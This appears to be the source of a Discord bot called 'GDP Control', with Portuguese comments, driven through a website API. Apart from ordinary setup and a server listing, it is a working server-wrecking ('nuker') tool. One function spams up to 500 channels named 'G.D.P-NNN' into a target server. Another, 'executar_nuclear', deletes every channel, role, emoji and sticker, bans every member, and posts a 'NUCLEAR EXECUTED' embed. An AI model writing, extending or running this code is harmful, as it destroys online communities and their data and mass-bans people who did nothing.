import discord
from discord.ext import commands
import asyncio
import os
import sys
import json
from datetime import datetime

# ==================== CONFIGURAÇÕES ====================

# Função para ler token de múltiplas fontes
def obter_token():
    """Tenta obter o token de diferentes fontes"""
    
    # 1. Tentar variável de ambiente
    token = os.getenv('DISCORD_TOKEN')
    if token:
        print("✅ Token encontrado nas variáveis de ambiente")
        return token
    
    # 2. Tentar arquivo .env
    try:
        if os.path.exists('.env'):
            with open('.env', 'r', encoding='utf-8') as f:
                for linha in f:
                    linha = linha.strip()
                    if linha and not linha.startswith('#'):
                        if 'DISCORD_TOKEN' in linha:
                            partes = linha.split('=', 1)
                            if len(partes) == 2:
                                token = partes[1].strip().strip('"').strip("'")
                                print("✅ Token encontrado no arquivo .env")
                                return token
    except Exception as e:
        print(f"⚠️ Erro ao ler .env: {e}")
    
    # 3. Se não encontrou, exibir erro detalhado
    print("=" * 60)
    print("❌ ERRO CRÍTICO: DISCORD_TOKEN não encontrado!")
    print("=" * 60)
    print("📌 Para resolver:")
    print("1. No painel da Discloud, vá em 'Terminal'")
    print("2. Digite o comando:")
    print("   echo 'DISCORD_TOKEN=SEU_TOKEN_AQUI' > .env")
    print("3. Depois digite:")
    print("   restart")
    print("=" * 60)
    return None

# Obter token
TOKEN = obter_token()
if TOKEN is None:
    sys.exit(1)

print(f"🔑 Token carregado: {TOKEN[:15]}... (tamanho: {len(TOKEN)})")

# Configurar intents
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = False  # Não precisamos de mensagens

# Inicializar bot
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# ==================== EVENTOS DO BOT ====================

@bot.event
async def on_ready():
    """Quando o bot conecta ao Discord"""
    
    print("\n" + "=" * 60)
    print(f"✅ BOT ONLINE: {bot.user}")
    print(f"🆔 ID: {bot.user.id}")
    print("=" * 60)
    print(f"📡 Servidores conectados: {len(bot.guilds)}")
    print("-" * 40)
    
    for i, guild in enumerate(bot.guilds, 1):
        print(f"   {i}. {guild.name}")
        print(f"      ID: {guild.id}")
        print(f"      Membros: {guild.member_count}")
        print(f"      Dono: {guild.owner}")
        print()
    
    print("=" * 60)
    print("🚀 Modo de operação: API apenas")
    print("📌 Comandos disponíveis via site")
    print("=" * 60)
    
    # Atualizar status
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=f"{len(bot.guilds)} servidores | GDP Control"
        ),
        status=discord.Status.online
    )

@bot.event
async def on_guild_join(guild):
    """Quando entra em um novo servidor"""
    print(f"📥 Entrou no servidor: {guild.name} (ID: {guild.id})")
    
    # Atualizar status
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=f"{len(bot.guilds)} servidores | GDP Control"
        )
    )

@bot.event
async def on_guild_remove(guild):
    """Quando sai de um servidor"""
    print(f"📥 Saiu do servidor: {guild.name} (ID: {guild.id})")
    
    # Atualizar status
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=f"{len(bot.guilds)} servidores | GDP Control"
        )
    )

@bot.event
async def on_error(event, *args, **kwargs):
    """Tratamento de erros"""
    print(f"❌ Erro no evento {event}: {args} {kwargs}")

# ==================== FUNÇÕES PRINCIPAIS (CHAMADAS VIA API) ====================

async def listar_servidores():
    """Retorna lista de servidores onde o bot está"""
    servidores = []
    for guild in bot.guilds:
        servidores.append({
            "id": guild.id,
            "nome": guild.name,
            "membros": guild.member_count,
            "dono": str(guild.owner),
            "icone": str(guild.icon.url) if guild.icon else None,
            "criado_em": guild.created_at.isoformat() if guild.created_at else None
        })
    return servidores

async def criar_canais_gdp(guild_id: int, quantidade: int = 100):
    """
    Cria canais G.D.P no servidor especificado
    Esta função é chamada diretamente pela API
    """
    
    print(f"📝 Iniciando criação de {quantidade} canais no servidor {guild_id}")
    
    # Buscar o servidor
    guild = bot.get_guild(guild_id)
    if not guild:
        print(f"❌ Servidor {guild_id} não encontrado")
        return {
            "sucesso": False,
            "erro": "Servidor não encontrado",
            "codigo": 404
        }
    
    # Verificar permissões
    if not guild.me.guild_permissions.manage_channels:
        print(f"❌ Sem permissão para criar canais em {guild.name}")
        return {
            "sucesso": False,
            "erro": "Bot não tem permissão para gerenciar canais",
            "codigo": 403
        }
    
    # Validar quantidade
    if quantidade > 500:
        quantidade = 500
        print("⚠️ Quantidade limitada a 500 canais")
    
    if quantidade < 1:
        quantidade = 1
    
    # Criar canais
    criados = 0
    erros = 0
    canais_criados = []
    
    for i in range(1, quantidade + 1):
        try:
            nome = f"G.D.P-{i:03d}"
            
            # Verificar se canal já existe
            if discord.utils.get(guild.channels, name=nome):
                print(f"⚠️ Canal {nome} já existe, pulando...")
                continue
            
            # Criar canal
            canal = await guild.create_text_channel(
                nome,
                reason=f"Comando GDP via site - {datetime.now().strftime('%d/%m/%Y %H:%M')}"
            )
            
            criados += 1
            canais_criados.append(canal.name)
            
            # Log a cada 10 canais
            if criados % 10 == 0:
                print(f"📊 Progresso: {criados}/{quantidade} canais criados")
            
            # Delay para rate limit
            await asyncio.sleep(0.5)
            
        except discord.Forbidden:
            print("❌ Sem permissão para criar canais")
            erros += 1
            break
            
        except discord.HTTPException as e:
            if e.status == 429:  # Rate limit
                print("⏳ Rate limit detectado, aguardando...")
                await asyncio.sleep(5)
                erros += 1
            else:
                print(f"❌ Erro HTTP: {e}")
                erros += 1
                
        except Exception as e:
            print(f"❌ Erro inesperado: {e}")
            erros += 1
    
    # Resultado final
    resultado = {
        "sucesso": True,
        "servidor": guild.name,
        "servidor_id": guild.id,
        "canais_criados": criados,
        "canais_solicitados": quantidade,
        "erros": erros,
        "canais": canais_criados[:10],  # Primeiros 10 como exemplo
        "timestamp": datetime.now().isoformat()
    }
    
    print(f"✅ GDP concluído: {criados} canais criados em {guild.name}")
    return resultado

async def executar_nuclear(guild_id: int):
    """
    Executa limpeza nuclear no servidor
    Esta função é chamada diretamente pela API
    """
    
    print(f"☢️ Iniciando limpeza nuclear no servidor {guild_id}")
    
    # Buscar o servidor
    guild = bot.get_guild(guild_id)
    if not guild:
        print(f"❌ Servidor {guild_id} não encontrado")
        return {
            "sucesso": False,
            "erro": "Servidor não encontrado",
            "codigo": 404
        }
    
    # Verificar permissões
    if not guild.me.guild_permissions.administrator:
        print(f"❌ Sem permissão de administrador em {guild.name}")
        return {
            "sucesso": False,
            "erro": "Bot precisa ser administrador",
            "codigo": 403
        }
    
    # Inicializar contadores
    resultados = {
        "canais": 0,
        "cargos": 0,
        "emojis": 0,
        "stickers": 0,
        "banidos": 0,
        "erros": 0
    }
    
    # 1. DELETAR CANAIS
    print("🗑️ Deletando canais...")
    for channel in guild.channels:
        try:
            await channel.delete()
            resultados["canais"] += 1
            await asyncio.sleep(0.3)
        except Exception as e:
            print(f"   Erro ao deletar {channel.name}: {e}")
            resultados["erros"] += 1
    
    # 2. DELETAR CARGOS (exceto @everyone)
    print("👑 Deletando cargos...")
    for role in guild.roles:
        if role.name != "@everyone" and not role.managed:
            try:
                await role.delete()
                resultados["cargos"] += 1
                await asyncio.sleep(0.3)
            except Exception as e:
                print(f"   Erro ao deletar cargo {role.name}: {e}")
                resultados["erros"] += 1
    
    # 3. DELETAR EMOJIS
    print("😀 Deletando emojis...")
    for emoji in guild.emojis:
        try:
            await emoji.delete()
            resultados["emojis"] += 1
            await asyncio.sleep(0.3)
        except Exception as e:
            print(f"   Erro ao deletar emoji: {e}")
            resultados["erros"] += 1
    
    # 4. DELETAR STICKERS
    print("📌 Deletando stickers...")
    for sticker in guild.stickers:
        try:
            await sticker.delete()
            resultados["stickers"] += 1
            await asyncio.sleep(0.3)
        except Exception as e:
            print(f"   Erro ao deletar sticker: {e}")
            resultados["erros"] += 1
    
    # 5. BANIR MEMBROS
    print("👥 Banindo membros...")
    for member in guild.members:
        if member != guild.me:
            try:
                await member.ban(reason="Nuclear via site - Limpeza total")
                resultados["banidos"] += 1
                
                # Log a cada 10 bans
                if resultados["banidos"] % 10 == 0:
                    print(f"   Progresso: {resultados['banidos']} membros banidos")
                
                await asyncio.sleep(1)  # Delay maior para bans
            except Exception as e:
                print(f"   Erro ao banir {member.name}: {e}")
                resultados["erros"] += 1
    
    # 6. CRIAR CANAL DE LOG (opcional)
    try:
        log_channel = await guild.create_text_channel("🚨-nuclear-log")
        
        embed = discord.Embed(
            title="☢️ NUCLEAR EXECUTADO",
            description="Limpeza total do servidor realizada via site",
            color=0xff0000,
            timestamp=datetime.now()
        )
        embed.add_field(name="🗑️ Canais deletados", value=f"```{resultados['canais']}```", inline=True)
        embed.add_field(name="👑 Cargos deletados", value=f"```{resultados['cargos']}```", inline=True)
        embed.add_field(name="😀 Emojis deletados", value=f"```{resultados['emojis']}```", inline=True)
        embed.add_field(name="📌 Stickers deletados", value=f"```{resultados['stickers']}```", inline=True)
        embed.add_field(name="👥 Membros banidos", value=f"```{resultados['banidos']}```", inline=True)
        embed.add_field(name="⚠️ Erros", value=f"```{resultados['erros']}```", inline=True)
        embed.set_footer(text=f"Executado em {datetime.now().strftime('%d/%m/%Y %H:%M')}")
        
        await log_channel.send(embed=embed)
    except:
        pass
    
    # Resultado final
    resultado = {
        "sucesso": True,
        "servidor": guild.name,
        "servidor_id": guild.id,
        "resultados": resultados,
        "timestamp": datetime.now().isoformat()
    }
    
    print(f"☢️ Nuclear concluído em {guild.name}")
    print(f"   Canais: {resultados['canais']}, Cargos: {resultados['cargos']}, Banidos: {resultados['banidos']}")
    return resultado

# ==================== INICIAR BOT ====================

if __name__ == "__main__":
    try:
        print("🚀 Iniciando bot GDP Control...")
        bot.run(TOKEN)
    except discord.LoginFailure:
        print("❌ Erro de login: Token inválido")
    except Exception as e:
        print(f"❌ Erro ao iniciar bot: {e}")